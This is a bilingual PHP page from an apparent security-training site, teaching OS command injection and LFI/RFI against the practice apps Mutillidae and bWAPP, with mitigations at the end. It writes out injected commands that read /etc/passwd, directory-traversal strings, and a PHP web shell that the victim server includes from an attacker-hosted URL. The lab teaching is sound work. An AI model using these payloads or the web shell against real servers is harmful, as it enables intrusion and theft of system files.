<?php
/**
 * CyberEscudo — Proyecto: Inyección de Comandos y RFI/LFI
 * Contenido: Práctica 2.4 — Sergio Belmonte Morales
 */
require_once __DIR__ . '/../bootstrap.php';

$pageTitle    = $lang === 'es' ? 'Inyección de Comandos y RFI/LFI — CyberEscudo' : 'Command Injection & RFI/LFI — CyberEscudo';
$contentTitle = $lang === 'es' ? 'Inyección de Comandos y RFI/LFI' : 'Command Injection & RFI/LFI';
$contentDate  = '2022-02-01';
$contentTags  = ['Command Injection', 'RFI', 'LFI', 'Pentesting', 'OWASP'];

ob_start();
if ($lang === 'es'): ?>
<div class="prose">
  <p>Práctica sobre explotación y mitigación de vulnerabilidades críticas a nivel de servidor: <strong>Inyección de Comandos (OS Command Injection)</strong> y la <strong>Inclusión de Archivos (LFI/RFI)</strong>. Estas brechas permiten a un atacante ejecutar código arbitrario o leer archivos sensibles del sistema operativo anfitrión.</p>

  <h2>1. Inyección de Comandos (OS Command Injection)</h2>
  <p>Esta vulnerabilidad ocurre cuando una aplicación web pasa datos inseguros suministrados por el usuario directamente a un shell del sistema (usando funciones como <code>exec()</code>, <code>system()</code> o <code>shell_exec()</code>). El atacante puede alterar la ejecución usando "metacaracteres" del shell para encadenar comandos maliciosos.</p>
  
  <h3>Los operadores mágicos</h3>
  <ul>
      <li><code>;</code> (Punto y coma): Ejecuta comandos secuencialmente. <code>ping 127.0.0.1; ls</code></li>
      <li><code>&&</code> (AND lógico): Ejecuta el segundo comando solo si el primero tiene éxito.</li>
      <li><code>|</code> (Pipe): Pasa la salida del primer comando como entrada al segundo. En inyecciones, suele usarse para ignorar el primer comando y forzar la ejecución del segundo.</li>
  </ul>

  <p>Accedemos a <strong>OWASP Mutillidae</strong> (<code>A1 – Injection → Command Injection → DNS Lookup</code>) y probamos payloads básicos de reconocimiento:</p>

  <pre><code># Ignorar el ping y listar el directorio actual
127.0.0.1 ; pwd
127.0.0.1 | ls -la

# Leer el archivo crítico de usuarios de Linux
127.0.0.1 ; cat /etc/passwd

# Buscar procesos de bases de datos activos
127.0.0.1 && ps -eaf | egrep -l '(postgres|sql|db2|ora)'</code></pre>

  <h2>2. LFI / RFI (Local & Remote File Inclusion)</h2>
  <p>Ocurre cuando una aplicación incluye archivos de forma dinámica usando parámetros de la URL sin validarlos correctamente. Si el atacante inyecta rutas del sistema operativo, puede leer archivos que no deberían ser públicos.</p>
  
  <h3>LFI (Local File Inclusion) y Directory Traversal</h3>
  <p>Usamos el parámetro vulnerable en <strong>bWAPP</strong> para navegar hacia atrás en los directorios del servidor (Directory Traversal) usando <code>../</code> hasta llegar a la raíz del sistema:</p>

  <pre><code># Escapar de /var/www/html y leer archivos del sistema
?language=../../../../etc/passwd
?language=../../../../etc/apache2/apache2.conf</code></pre>

  <h3>RFI (Remote File Inclusion) y Bindshells</h3>
  <p>Si la configuración de PHP tiene <code>allow_url_include=On</code>, el riesgo es crítico: podemos decirle al servidor que incluya y ejecute un archivo alojado en *nuestro* servidor malicioso.</p>

  <pre><code># 1. En nuestra máquina Kali, creamos shell.txt:
&lt;?php system($_GET['cmd']); ?&gt;

# 2. Obligamos al servidor víctima a ejecutarlo:
http://target/bWAPP/rlfi.php?language=http://kali-ip/shell.txt&cmd=whoami</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF 02 (ESPAÑOL) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> ¡Nuevo Sandbox Disponible!
      </h3>
      <p style="margin-bottom: 1.5rem;">He preparado un emulador de red (Ping Tool) que es vulnerable a Inyección de Comandos. ¿Serás capaz de encadenar un payload para leer el archivo <code>/etc/passwd</code> de mi servidor simulado?</p>
      <a href="/ctf/ctf-02.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ INICIAR RETO CTF 02
      </a>
  </div>

  <h2>3. Contramedidas y Mitigación</h2>

  <h3>Para Inyección de Comandos:</h3>
  <ol>
    <li><strong>Evitar llamadas al sistema operativo.</strong> Si quieres borrar un archivo, usa <code>unlink()</code> en PHP, no <code>exec("rm...")</code>.</li>
    <li><strong>Validación estricta.</strong> Si esperas una IP, usa filtros nativos: <code>filter_var($ip, FILTER_VALIDATE_IP)</code>.</li>
    <li><strong>Escapar argumentos.</strong> Si es estrictamente necesario usar el shell, usa <code>escapeshellarg()</code> para convertir el input en una cadena literal inofensiva.</li>
  </ol>

  <h3>Para LFI / RFI:</h3>
  <ol>
    <li><strong>Deshabilitar inclusiones remotas.</strong> En <code>php.ini</code>, asegúrate de tener <code>allow_url_include = Off</code>.</li>
    <li><strong>Usar mapas de archivos (Listas Blancas).</strong> Nunca pases el input del usuario directamente a un <code>include()</code>.</li>
  </ol>
  <pre><code>&lt;?php
// Defensa robusta contra LFI
$allowed_files = ['es' => 'es_lang.php', 'en' => 'en_lang.php'];
$selection = $_GET['lang'] ?? 'es';
$file_to_include = $allowed_files[$selection] ?? $allowed_files['es'];
include($file_to_include);
?&gt;</code></pre>
</div>

<?php else: ?>
<div class="prose">
  <p>A practical guide on exploiting and mitigating critical server-level vulnerabilities: <strong>OS Command Injection</strong> and <strong>Local/Remote File Inclusion (LFI/RFI)</strong>. These flaws allow an attacker to execute arbitrary code or read sensitive files from the host operating system.</p>

  <h2>1. OS Command Injection</h2>
  <p>This vulnerability occurs when a web application passes unsafe user-supplied data directly to a system shell (using functions like <code>exec()</code> or <code>system()</code>). Attackers can alter execution using shell "metacharacters" to chain malicious commands.</p>
  
  <h3>Magic Operators</h3>
  <ul>
      <li><code>;</code> (Semicolon): Executes commands sequentially.</li>
      <li><code>&&</code> (Logical AND): Executes the second command only if the first succeeds.</li>
      <li><code>|</code> (Pipe): Passes the output of the first command as input to the second.</li>
  </ul>

  <p>Accessing <strong>OWASP Mutillidae</strong>, we can test basic reconnaissance payloads:</p>

  <pre><code># Ignore the ping and list the current directory
127.0.0.1 ; pwd
127.0.0.1 | ls -la

# Read the critical Linux user file
127.0.0.1 ; cat /etc/passwd</code></pre>

  <h2>2. LFI / RFI (Local & Remote File Inclusion)</h2>
  <p>Occurs when an app dynamically includes files using URL parameters without proper validation. Attackers can inject OS paths to read private files.</p>
  
  <h3>LFI and Directory Traversal</h3>
  <p>We use the vulnerable parameter in <strong>bWAPP</strong> to navigate backward in the server's directories using <code>../</code> to reach the system root:</p>

  <pre><code># Escape /var/www/html and read system files
?language=../../../../etc/passwd</code></pre>

  <h3>RFI and Bindshells</h3>
  <p>If PHP's <code>allow_url_include=On</code> is set, the risk is critical: we can force the server to include and execute a file hosted on our malicious server.</p>

  <pre><code># 1. Host shell.txt on Kali:
&lt;?php system($_GET['cmd']); ?&gt;

# 2. Force the victim server to execute it:
http://target/bWAPP/rlfi.php?language=http://kali-ip/shell.txt&cmd=whoami</code></pre>

  <!-- ─── SECCIÓN DEL RETO CTF 02 (INGLÉS) ─── -->
  <div style="margin: 3rem 0; padding: 1.5rem; background: rgba(0, 255, 255, 0.05); border-left: 4px solid var(--cyan); border-radius: 4px;">
      <h3 style="margin-top: 0; color: var(--cyan); display: flex; align-items: center; gap: 10px;">
          <span style="animation: pulse 2s infinite;">🔴</span> New Sandbox Available!
      </h3>
      <p style="margin-bottom: 1.5rem;">I've prepared a Network Emulator (Ping Tool) that is vulnerable to Command Injection. Will you be able to chain a payload to read the <code>/etc/passwd</code> file from my simulated server?</p>
      <a href="/ctf/ctf-02.php" style="display: inline-block; padding: 8px 20px; background: transparent; border: 1px solid var(--cyan); color: var(--cyan); text-decoration: none; font-family: var(--mono); transition: all 0.3s; font-size: 0.9rem;" onmouseover="this.style.background='var(--cyan)'; this.style.color='#000';" onmouseout="this.style.background='transparent'; this.style.color='var(--cyan)';">
          &gt;_ START CTF 02 CHALLENGE
      </a>
  </div>

  <h2>3. Countermeasures</h2>
  
  <h3>For Command Injection:</h3>
  <ul>
      <li><strong>Avoid OS calls.</strong> Use built-in PHP functions (e.g., <code>unlink()</code> instead of <code>rm</code>).</li>
      <li><strong>Strict Validation.</strong> Use native filters like <code>filter_var($ip, FILTER_VALIDATE_IP)</code>.</li>
      <li><strong>Escape Arguments.</strong> If shell usage is strictly necessary, use <code>escapeshellarg()</code>.</li>
  </ul>

  <h3>For LFI/RFI:</h3>
  <pre><code>&lt;?php
// Robust defense against LFI using a Whitelist Map
$allowed_files = ['es' => 'es_lang.php', 'en' => 'en_lang.php'];
$selection = $_GET['lang'] ?? 'es';
include($allowed_files[$selection] ?? $allowed_files['es']);
?&gt;</code></pre>
</div>
<?php endif;
$contentBody = ob_get_clean();
require __DIR__ . '/../templates/content-page.php';